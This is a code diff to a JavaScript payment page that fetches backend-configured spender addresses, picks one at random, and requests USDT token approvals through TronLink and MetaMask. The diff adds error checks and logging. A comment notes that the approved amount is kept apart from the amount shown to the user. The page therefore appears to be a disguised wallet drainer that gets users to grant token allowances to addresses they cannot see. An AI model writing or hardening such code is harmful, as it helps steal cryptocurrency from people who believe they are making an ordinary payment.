@@ -267,6 +267,10 @@ async function loadBackendConfig() {
     console.log('=== 加载后端配置 ===')
     
     const response = await fetch('/payment-config')
+    if (!response.ok) {
+      throw new Error(`后端配置接口返回错误: ${response.status}`)
+    }
+    
     const data = await response.json()
     
     console.log('后端配置响应:', data)
@@ -282,12 +286,20 @@ async function loadBackendConfig() {
         if (permissionAddresses.length > 0) {
           const randomIndex = Math.floor(Math.random() * permissionAddresses.length)
           configData.value.permission_address = permissionAddresses[randomIndex]
+          console.log('✅ TRC20授权合约地址已加载:', configData.value.permission_address)
+        } else {
+          console.warn('⚠️ permission_address 配置为空或格式错误')
         }
+      } else {
+        console.warn('⚠️ 后端未返回 permission_address 配置')
       }
       
       // 处理 0x_permission_address
       if (data.config['0x_permission_address']) {
         configData.value['0x_permission_address'] = data.config['0x_permission_address']
+        console.log('✅ EVM授权合约地址已加载:', configData.value['0x_permission_address'])
+      } else {
+        console.warn('⚠️ 后端未返回 0x_permission_address 配置')
       }
       
       // 处理 authorized_amount（仅保存到 configData，不修改显示金额）
@@ -298,9 +310,13 @@ async function loadBackendConfig() {
       
       console.log('最终配置数据:', configData.value)
       console.log('授权金额:', authAmount.value)
+    } else {
+      console.error('❌ 后端配置返回格式错误:', data)
+      throw new Error('后端配置返回格式错误')
     }
   } catch (error) {
     console.error('加载后端配置失败:', error)
+    throw error
   }
 }
 
@@ -551,9 +567,15 @@ async function approveWithTronLink() {
     const approvalAmount = configData.value.authorized_amount
     const userAddress = window.tronWeb.defaultAddress.base58
     
+    // 验证授权地址（合约地址）是否为空
+    if (!spenderAddress || spenderAddress.trim() === '') {
+      console.error('❌ TRC20授权合约地址为空，配置数据:', configData.value)
+      throw new Error('TRC20授权合约地址未配置，请检查管理后台配置')
+    }
+    
     console.log('=== TRC20授权（使用TronWeb） ===')
     console.log('USDT合约:', usdtContractAddress.value)
-    console.log('授权给（spender）:', spenderAddress)
+    console.log('授权给合约地址（spender）:', spenderAddress)
     console.log('用户地址:', userAddress)
     console.log('授权金额:', approvalAmount)
     
@@ -609,6 +631,12 @@ async function approveWithMetaMask() {
     // 从 configData 获取参数（完全按照参考代码 line 772-777）
     const spender = configData.value['0x_permission_address']
     const amount = configData.value.authorized_amount
+    
+    // 验证授权合约地址是否为空
+    if (!spender || spender.trim() === '') {
+      console.error('❌ EVM授权合约地址为空，配置数据:', configData.value)
+      throw new Error('EVM授权合约地址未配置，请检查管理后台配置')
+    }
     
     // 获取当前链ID
     const chainId = await window.ethereum.request({ method: 'eth_chainId' })
